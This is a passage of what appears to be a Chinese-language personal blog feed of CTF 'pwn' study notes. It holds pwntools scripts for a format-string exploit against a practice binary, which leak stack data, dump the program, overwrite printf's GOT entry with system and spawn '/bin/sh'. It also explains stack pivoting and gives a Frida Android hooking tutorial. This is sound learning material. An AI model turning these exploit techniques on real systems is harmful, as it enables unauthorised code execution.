the stack；</p><p>那么就循环输入%p一直查看栈上的内容，正如上图的下半部分所示即可得出flag；</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#把格式化输出的地址转化为int类型的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2i</span>(<span class="params">b,<span class="built_in">len</span></span>):</span></span><br><span class="line">i = <span class="built_in">len</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">new_c = [<span class="number">0</span>] * i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">new_c[i - j - <span class="number">1</span>] = b[j]</span><br><span class="line"></span><br><span class="line">j -= <span class="number">2</span></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> (new_c[i] &gt; <span class="number">47</span>) &amp; (new_c[i] &lt; <span class="number">60</span>):</span><br><span class="line">res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">48</span>)</span><br><span class="line"><span class="keyword">elif</span> (new_c[i] &gt; <span class="number">96</span>) &amp; (new_c[i] &lt; <span class="number">103</span>):</span><br><span class="line">res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">87</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%%%d$p&#x27;</span> % i</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv()[:<span class="number">18</span>]</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(p64(b2i(data,<span class="number">18</span>)))</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><p>依然是查看位数和确定字符串偏移：</p><p><img src="https://s2.loli.net/2023/04/13/qfaWT7VbCBYkAdh.png" alt="blind"></p><p>此时的偏移就有用了，因为要劫持got；</p><p>如图可知，偏移为：6，也就是%6$p；</p><p>程序一般是从0x400000开始，要劫持got表就需要知道got内容，所以直接用字符串漏洞的方法泄露整个程序的数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="comment">#不断地开启关闭程序会有bug的时候，所以泄露三次</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">            p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">            <span class="comment">#偏移为多少，第一个便用多少+2</span></span><br><span class="line">            payload = <span class="string">b&#x27;%00008$s&#x27;</span> + <span class="string">b&#x27;STARTEND&#x27;</span> + p64(addr)</span><br><span class="line">            <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recvuntil(<span class="string">b&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">    data = leak(addr)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">        f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f.write(<span class="built_in">str</span>(data))</span><br><span class="line">        addr += <span class="built_in">len</span>(data)</span><br></pre></td></tr></table></figure><p>通用格式，直接套就行，使用之后便可得到原程序binary；</p><p>之后分析binary：</p><p><img src="https://s2.loli.net/2023/04/13/fH7oQebC3RAc89q.png" alt="main"></p><p>看得出整个程序非常简单；</p><p>可以知道的是无法利用栈溢出；</p><p>若要劫持got表也只有printf函数的；</p><p>所以思路是：</p><ul><li>泄露printf自身函数地址并计算出system；</li><li>覆盖got表；</li><li>输入binsh执行system函数成功攻击；</li></ul><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">printfgot = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次输入载入so中printf</span></span><br><span class="line">payload = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次输入泄漏printf，got地址写后面，不然会因为其高地址为0被截断</span></span><br><span class="line">payload = <span class="string">b&#x27;%00008$s&#x27;</span> + <span class="string">b&#x27;\x00aaaaaaa&#x27;</span> +p64(printfgot)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printfaddr = p.recv()</span><br><span class="line"><span class="comment">#8位地址的高位是0，会被格式化%s截断,调试得高位有两字节为0</span></span><br><span class="line">printfaddr += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">printfaddr = u64(printfaddr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算system</span></span><br><span class="line">libc.address = printfaddr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system = p64(system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第三次输入覆盖</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printfgot: system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第四次输入执行system</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;具体见：&lt;a href=&quot;https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_2&quot;&gt;利用 - CTF Wiki (ctf-wiki.org)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;写法&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Pwn" scheme="https://secondbc.github.io/SecondBC/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>栈迁移</title>
    <link href="https://secondbc.github.io/SecondBC/2023/04/11/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <id>https://secondbc.github.io/SecondBC/2023/04/11/%E6%A0%88%E8%BF%81%E7%A7%BB/</id>
    <published>2023-04-11T13:19:02.000Z</published>
    <updated>2023-04-13T15:29:39.462Z</updated>
    
    <content type="html"><![CDATA[<p>详细见：<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a></p><p><em><strong>其实际上的作用就是控制esp指向已构造好的payload区（覆盖量不够的情况，可先构造好一段payload到特定的内存段上）；</strong></em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用栈平衡的操作；</p><p>32位调用函数时，会有如下操作发生：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一步：操作执行流</span></span><br><span class="line">push eip+<span class="number">4</span><span class="comment">//保存函数返回地址入栈</span></span><br><span class="line">mov eip, Func<span class="comment">//执行流进入函数</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">//第二步：构造新栈帧</span></span><br><span class="line">push ebp<span class="comment">//保存上层函数栈底ebp</span></span><br><span class="line">mov ebp, esp<span class="comment">//将ebp指向旧ebp的值，也是此函数的栈底</span></span><br><span class="line">add esp, xxh<span class="comment">//增长栈顶构成新栈帧</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">//第三步：还原上层栈帧形态 Leave</span></span><br><span class="line">mov esp, ebp<span class="comment">//让esp重新指向此函数的栈底</span></span><br><span class="line">pop ebp<span class="comment">//将此时esp指向的旧ebp值弹出给ebp，此时ebp指向旧栈底，且esp指向ret的地址</span></span><br><span class="line"><span class="comment">//retn</span></span><br><span class="line">pop eip<span class="comment">//将此时ret地址的值弹出给执行流，此时esp指向旧栈顶</span></span><br></pre></td></tr></table></figure><p>第三步的即为第二部的逆运算，可以称这步为Leave，如果能够劫持在函数里的旧ebp值，就可以使得 pop ebp 到一个可控的地方，栈顶的位置是由ebp的值而控制：mov esp，ebp；从而可能影响esp，从而控制进程流；</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>如下图所示：</p><p><img src="https://s2.loli.net/2023/04/13/9KN3pzjikEq7DQM.png" alt="current"></p><p>意思是在Leave中，需要颠倒1，2行的内容；</p><p>如何颠倒，很简单，用gadget思想；</p><p>即首先控制旧ebp和ret地址，让ret地址返回到新的一组Leave中去，此时可以把esp的值控制为第一次的ebp的值，使得栈顶转移到另一处内存空间，达成栈迁移；</p><p>执行流程：</p><ol><li>使用gadget寻找新一组的Leave地址：NewLeaveAddr，以及目标栈顶位置：AimAddr；</li><li>覆盖旧址ebp为 AimAddr-4 （64位-8，因为第二次执行Leave时，会再次pop ebp，使得esp下降，即往高地址走一格）</li><li>覆盖ret地址为 NewLeaveAddr；</li></ol><p>执行之后，新的栈顶指向AimAddr（此时还未执行pop eip），栈底指向AimAddr-4处的数值；</p><h2 id="运用情况"><a href="#运用情况" class="headerlink" title="运用情况"></a>运用情况</h2><p>这个技术运用于栈溢出返回字节不够时的情况，此时只用覆盖ebp和ret地址就行；</p><p>能够使用该技术的情景：</p><ol><li>存在leave ret gadget；</li><li>存在可执行 payload 的内存段；</li></ol><p>一般而言，能执行shellcode的地方直接ret就行了，不需要这么复杂，不能执行指令的片段上，此时需要运用在栈上，使得控制的栈帧介于输入的变量缓冲区上，把可覆盖区域尽量拉长，利用已填写的 payload 再次实现经典栈溢出；</p><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p><img src="https://s2.loli.net/2023/04/13/IevWdjVtYfoHg6J.png" alt="code"></p><p>上图为一个栈帧，此时最左侧为变量数组下标0处，也是控制esp指向的目标位置；</p><ol><li>确定旧ebp与该变量的偏移，因为可以通过格式化字符串泄露旧ebp内容，从而动态地计算出此时此刻变量在栈中的地址：AimAddr；</li><li>找到gadget NewLeaveAddr，此时覆盖ebp处为变量地址，ret地址为gadget地址；</li><li>可知当执行之后，esp会减少一格到此变量下标1处，且此时（pop eip）即ret还没执行；</li></ol><p>聪明如你，当现在的情况即是执行ret的时刻，那么后面的内容也就是传统栈溢出所需要填充的内容了；</p><p>这个时候就可以在变量上面直接地填写，不需要在变量溢出后填写；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;详细见：&lt;a href=&quot;https://www.cnblogs.com/max1z/p/15299000.html&quot;&gt;栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;其实际上的作用就是控制esp指</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Pwn" scheme="https://secondbc.github.io/SecondBC/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Frida学习日记</title>
    <link href="https://secondbc.github.io/SecondBC/2023/04/11/Frida%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>https://secondbc.github.io/SecondBC/2023/04/11/Frida%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2023-04-11T13:18:53.000Z</published>
    <updated>2024-07-24T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载安装和简要说明"><a href="#下载安装和简要说明" class="headerlink" title="下载安装和简要说明"></a>下载安装和简要说明</h2><p>下载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><p>下载 github 上的 frida server，类似ida的server；</p><p><a href="https://github.com/frida/frida/releases">Releases · frida/frida (github.com)</a></p><p>需要下载的名称为：frida-server-16.0.10-android-arm64.xz；（模拟器下载x64版本）</p><p>之后熟悉adb的使用：(需要root手机，模拟器也行但比较麻烦)</p><p><a href="https://blog.csdn.net/weixin_43927138/article/details/90477966">adb下载安装及使用_Dongs丶的博客-CSDN博客_adb下载</a></p><p>需要用到的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb devices//查看是否连接到手机设备</span><br><span class="line">adb shell //进入手机shell</span><br><span class="line">adb push A/path B/path //将电脑上A路径的文件传到手机B路径上 一般B是 /sdcard</span><br><span class="line">---</span><br><span class="line">进入shell后操作：</span><br><span class="line">su//sudo给权限</span><br><span class="line">mv A/path B/path//转移（剪切）文件位置A到B，一般放到 /data/local</span><br><span class="line">chmod 777 file //赋全权限</span><br></pre></td></tr></table></figure><p>使用命令以激活server：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frida_server64</span><br><span class="line">---</span><br><span class="line">电脑本机操作：</span><br><span class="line">adb forward tcp:27042 tcp:27042//转发手机端口到电脑</span><br></pre></td></tr></table></figure><p>查看APP包名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list packages -3</span><br></pre></td></tr></table></figure><p>MuMu模拟器特殊说法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:7555//以usb连接到模拟器</span><br></pre></td></tr></table></figure><p>指定设备转发端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb -s ID forward tcp:xxx tcp:xxx</span><br></pre></td></tr></table></figure><h2 id="frida常用参数"><a href="#frida常用参数" class="headerlink" title="frida常用参数"></a>frida常用参数</h2><p>执行命令： frida-ps, 展示进程应用；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-f //启动app</span><br><span class="line">-R //remote</span><br><span class="line">-l //load JS 脚本</span><br></pre></td></tr></table></figure><p>如加载一个app并装载脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -R -f app包名 -l 脚本.js</span><br></pre></td></tr></table></figure><h2 id="Frida实现调用函数"><a href="#Frida实现调用函数" class="headerlink" title="Frida实现调用函数"></a>Frida实现调用函数</h2><p>用Jeb找到包名，类名，以及函数名及其调用约定；</p><p>编写JS执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ClassName = Java.use(<span class="string">&quot;PackageName.ClassName&quot;</span>)<span class="comment">//定义一个类常量</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//一般新建变量用let</span></span><br><span class="line">    <span class="keyword">let</span> ObjectName = ClassName.$new()<span class="comment">//实例化类，有静态修饰的不用做这一步</span></span><br><span class="line">    <span class="comment">//new里面可加参数</span></span><br><span class="line">    <span class="comment">//如实例化一个字符串类</span></span><br><span class="line">    <span class="keyword">const</span> stringClass = Java.use(<span class="string">&quot;java.lang.String&quot;</span>)</span><br><span class="line">    <span class="keyword">let</span> res = ObejectName.MethodName( stringClass.$new(<span class="string">&#x27;123&#x27;</span>) )<span class="comment">//执行方法且实例化并得到结果</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//base64</span></span><br><span class="line">    <span class="keyword">const</span> b64Class = Java.use(<span class="string">&quot;android.util.Base64&quot;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log( b64Class.encodeToString(res,<span class="number">0</span>) )<span class="comment">//打印base64编码res信息到调试窗</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>总结：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开头</span></span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)<span class="comment">//内容写在大括号里</span></span><br><span class="line">---</span><br><span class="line"><span class="comment">//使用类</span></span><br><span class="line">Java.use(<span class="string">&quot;PakageName.ClassName&quot;</span>)</span><br><span class="line">---</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line">ClassName.$new()</span><br><span class="line">---</span><br><span class="line"><span class="comment">//打印信息</span></span><br><span class="line"><span class="built_in">console</span>.log()</span><br></pre></td></tr></table></figure><h2 id="Frida简单实现hook-java层"><a href="#Frida简单实现hook-java层" class="headerlink" title="Frida简单实现hook-java层"></a>Frida简单实现hook-java层</h2><p>不管是否静态，可以如下书写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ClassName.FuncName.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,...</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//your aim...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同种写法</span></span><br><span class="line">ClassName[<span class="string">&quot;FuncName&quot;</span>].implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,...</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//your aim...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是需要和上面的一样，先构造类常量，然后实例化；</p><p>此写法是直接覆盖原函数的内容，不会执行原本函数的内容，所以要规定好调用约定，返回对应的内容；</p><p>在改写函数中使用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.FuncName(...)   #同款写法: <span class="built_in">this</span>[<span class="string">&quot;FuncName&quot;</span>](...)</span><br></pre></td></tr></table></figure><p>可以实现调用此类的原函数；</p><p>如果函数有重载，则写法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassName.FuncName.overload(<span class="string">&#x27;&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,...</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//your aim...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单引号里是参数的类型，如果是基本类型，则表示法为： <code>[B</code>    表示为byte；</p><p>如果是类类型，则直接输入其对应包的对应类名就行，如String类型： <code>java.lang.String</code>；</p><p>一般而言，对于java常用类的函数hook，要有过滤，即对应地方调用的参数特点做出if判断并更改代码逻辑；</p><p>因为很多地方也会调用到相同的函数，此时就直接返回 this.FuncName() ，就不会使得程序崩溃；</p><p>举例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hookMainA</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> MainActivity = Java.use(<span class="string">&quot;com.example.challenge.MainActivity&quot;</span>);</span><br><span class="line">        MainActivity[<span class="string">&quot;a&quot;</span>].implementation = <span class="function"><span class="keyword">function</span> (<span class="params">bArr</span>) </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`MainActivity.a is called: bArr=<span class="subst">$&#123;bArr&#125;</span>`</span>); <span class="comment">//拿参数</span></span><br><span class="line">            <span class="keyword">let</span> result = <span class="built_in">this</span>[<span class="string">&quot;a&quot;</span>](bArr);<span class="comment">//执行原本函数</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`MainActivity.a result=<span class="subst">$&#123;result&#125;</span>`</span>);        <span class="comment">//拿结果</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    hookMainA();</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure><p>重载举例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hookMainA</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> MainActivity = Java.use(<span class="string">&quot;com.example.challenge.MainActivity&quot;</span>);</span><br><span class="line">        MainActivity[<span class="string">&quot;b&quot;</span>].overload(<span class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;[B&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">bArr,byte</span>) </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`MainActivity.a is called: bArr=<span class="subst">$&#123;bArr&#125;</span>`</span>); <span class="comment">//拿参数</span></span><br><span class="line">            <span class="keyword">let</span> result = <span class="built_in">this</span>[<span class="string">&quot;a&quot;</span>](bArr);<span class="comment">//执行原本函数</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`MainActivity.a result=<span class="subst">$&#123;result&#125;</span>`</span>);        <span class="comment">//拿结果</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    hookMainA();</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure><h2 id="Hook-so层"><a href="#Hook-so层" class="headerlink" title="Hook so层"></a>Hook so层</h2><p>hook so层要注意一点，要当so文件动态链接到应用后，才能调用其函数，不然会空指针报错，这和pwn的ret2libc一个道理；</p><p>hook so一般有两种方法，这里先介绍第一种，导出表 Export，找到导出的地址；</p><p>操作so层时不用 java.use ，用拦截器： Interceptor；</p><p>这里用获取一个函数传参结构体的打印代码解释：</p><p>假设原代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = AimFunc(a1,a2,&amp;v16,...);</span><br></pre></td></tr></table></figure><p>此时第三个参数便是此时需要获取的结构体地址；</p><p>在32位程序中，指针占4字节，而结构体的地址过去第一个字段是真实的结构体数据的指针，隔了4个字节之后的，是这个结构体的大小；</p><p>那么对应hook代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 